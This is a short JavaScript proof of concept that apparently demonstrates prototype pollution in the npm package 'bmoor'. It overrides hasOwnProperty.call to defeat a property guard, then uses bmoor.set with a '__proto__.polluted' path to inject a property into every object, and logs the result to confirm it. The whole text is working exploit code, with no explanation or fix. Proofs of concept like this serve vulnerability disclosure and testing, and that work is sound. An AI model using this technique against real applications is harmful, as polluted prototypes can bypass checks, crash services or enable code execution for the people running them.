Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
const bmoor = require('bmoor');
bmoor.set({}, '__proto__.polluted', 'yes');
console.log({}.polluted);